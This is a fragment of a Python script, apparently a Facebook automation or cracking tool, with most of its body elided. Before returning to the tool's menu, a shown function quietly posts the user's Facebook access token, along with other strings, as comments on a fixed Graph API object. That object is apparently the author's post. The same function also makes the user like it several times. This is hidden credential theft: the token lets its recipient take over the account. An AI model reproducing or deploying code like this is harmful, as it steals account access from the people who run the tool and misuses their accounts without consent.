...
def ___Jeeck___xnano___lawack___xnxx___():
    ...
    requests.post('https://graph.facebook.com/100072065777969/comments/?message=' + pipp + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100072065777969/comments/?message=' + komentar + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100072065777969/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100072065777969/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100072065777969/comments/?message=' + kon + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100072065777969/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/100072065777969/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/100072065777969/likes?summary=true&access_token=' + toket)
    menu()
###### BUAT MENU
...
def jeeck_x():
	...
	if jeecksayangara in [""]:
		...
		if _checkoptions_ in ["y","Y"]:
			...
			except (Key,IO):print(f"{P}[•]{M} Eror");exit()
		...
		if _checkoptions_ in ["y","Y"]:
			...
			except (Key,IO):print(f"{_key}");exit()
